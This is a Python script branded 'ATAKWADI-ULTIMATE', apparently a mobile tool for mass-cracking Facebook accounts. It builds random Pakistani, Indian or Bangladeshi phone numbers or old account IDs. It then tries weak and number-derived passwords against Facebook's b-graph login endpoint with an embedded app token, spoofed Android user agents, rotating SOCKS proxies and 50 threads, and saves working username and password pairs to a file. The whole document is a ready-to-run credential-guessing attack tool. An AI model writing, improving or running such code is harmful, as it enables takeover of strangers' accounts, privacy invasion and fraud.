import os, sys, time, random, string, requests, re, json
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# --- Auto Module Installer ---
try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    os.system('pip install requests bs4')

# --- Colors ---
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
W = '\033[1;37m' # White
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue

# --- Global Variables ---
loop = 0
oks = []
proxies = []

# --- 2025 Modern User Agents (Telenor & 4G Optimized) ---
def get_ua():
    android_version = random.choice(['13', '14', '15'])
    fb_version = f"{random.randint(450, 560)}.0.0.{random.randint(10, 99)}.{random.randint(100, 250)}"
    model = random.choice(['SM-S928B', 'Pixel 9 Pro', 'V2303', 'Infinix Note 40', 'RMX3840'])
    ua = f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fb_version};FBBV/{random.randint(500000000, 999999999)};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

# --- UID Age Checker ---
def get_age(uid):
    try:
        if uid.startswith('100000'): return "2009"
        elif uid.startswith('100001'): return "2010"
        elif uid.startswith('100002'): return "2011"
        elif uid.startswith('100003'): return "2012"
        elif uid.startswith('6155'): return "2024-25"
        else: return "Old Account"
    except: return "N/A"

# --- Logo & Branding ---
def logo():
    os.system('clear')
    now = datetime.now().strftime("%H:%M:%S")
    print(f"""
{R}   ▄▀▄▀▀▀▀▄▀▄  {W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{R}  █          █ {G}  █████  ██████  █████  ██  ██
{R}  █          █ {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}  ▀▄        ▄▀ {G}  ██████   ██    ██████ ████  
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██ ██ 
{R}    █      █   {G}  ██  ██   ██    ██  ██ ██  ██
{W}    ▀▀▀▀▀▀▀▀   {R}       [ ATAKWADI-ULTIMATE ]
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G} [+] NETWORK : TELENOR/ALL SIMs
{G} [+] TIME    : {Y}{now}
{G} [+] SAVE    : /sdcard/atakwadi_ok.txt
{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# --- Main Menu ---
def main_menu():
    logo()
    print(f" {G}[1] Telenor Special (0340-0349)")
    print(f" {G}[2] Pakistan All (Jazz, Zong, Ufone)")
    print(f" {G}[3] India/Bangladesh Cloning")
    print(f" {G}[4] Old UID Cloning (2009-2012)")
    print(f" {G}[5] File Cloning (Put .txt path)")
    print(f" {R}[0] Exit")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    choice = input(f' {G}[?] Select: {W}')
    
    if choice == '1': pk_start(['0340','0341','0342','0343','0344','0345','0346','0347','0348','0349'])
    elif choice == '2': pk_start(['0300','0301','0315','0333','0321'])
    elif choice == '3': int_start()
    elif choice == '4': old_start()
    elif choice == '5': file_start()
    else: exit()

def pk_start(codes):
    logo()
    print(f" {G}[+] Select Code: {W}{', '.join(codes)}")
    code = input(f" {G}[?] Enter Code: {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    start_crack(ids)

def int_start():
    logo()
    code = input(f" {G}[?] Enter Country Code (e.g +91, +880): {W}")
    limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [code + "".join(random.choices(string.digits, k=7)) for _ in range(limit)]
    start_crack(ids)

def old_start():
    logo(); limit = int(input(f" {G}[?] Limit: {W}"))
    ids = [random.choice(['100000', '100001', '100002', '100003']) + "".join(random.choices(string.digits, k=8)) for _ in range(limit)]
    start_crack(ids)

def file_start():
    logo(); path = input(f" {G}[?] File Path (e.g /sdcard/ids.txt): {W}")
    try:
        ids = open(path, 'r').read().splitlines()
        start_crack(ids)
    except: print(f" {R}[!] File Not Found!"); time.sleep(2); main_menu()

# --- Cracking Engine ---
def start_crack(ids):
    global proxies
    logo()
    if os.path.exists('proxy.txt'):
        proxies = open('proxy.txt', 'r').read().splitlines()
    
    print(f" {G}[+] Total IDs : {W}{len(ids)}")
    print(f" {R}[!] Note: Flight Mode Use Karein (Telenor Best)")
    print(f"{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    with tred(max_workers=50) as engine:
        for uid in ids:
            engine.submit(crack_method, uid)
    
    print(f"\n{W}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f" {G}[+] OK IDs: {len(oks)}")
    input(f" {G}[?] Press Enter to Back")
    main_menu()

def crack_method(uid):
    global loop, oks
    age = get_age(uid)
    dt = datetime.now().strftime("%H:%M")
    sys.stdout.write(f'\r {W}[ATAKWADI] {loop}|{G}OK:{len(oks)}{W} '); sys.stdout.flush()
    
    try:
        # High Success Password Strategy
        first = "khan" # Default
        pws = [uid, uid[6:], '123456', '12345678', '786786', 'pakistan', '572732', '575757', 'telenor123', '000786']
        
        # Adding name-based passwords if it's a number
        if len(uid) >= 10:
            pws.append(uid[:6])
            pws.append(uid[3:])

        for pw in pws:
            if len(pw) < 6: continue
            ua = get_ua()
            session = requests.Session()
            
            if proxies:
                proxy = random.choice(proxies)
                session.proxies.update({'http': 'socks5://'+proxy, 'https': 'socks5://'+proxy})

            # B-Graph API for High Speed
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "sdk_style": "android",
                "email": uid,
                "password": pw,
                "generate_session_cookies": "1",
                "locale": "en_US",
                "method": "post"
            }
            
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f'{G} [OK] {uid} | {pw}')
                print(f'{G} [AGE] {age} {G}| [TIME] {dt}')
                print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                oks.append(uid)
                open('/sdcard/atakwadi_ok.txt', 'a').write(f"{uid}|{pw}|{age}|{dt}\n")
                break
            elif "checkpoint" in str(res):
                break
        loop += 1
    except:
        pass

if __name__ == "__main__":
    main_menu()
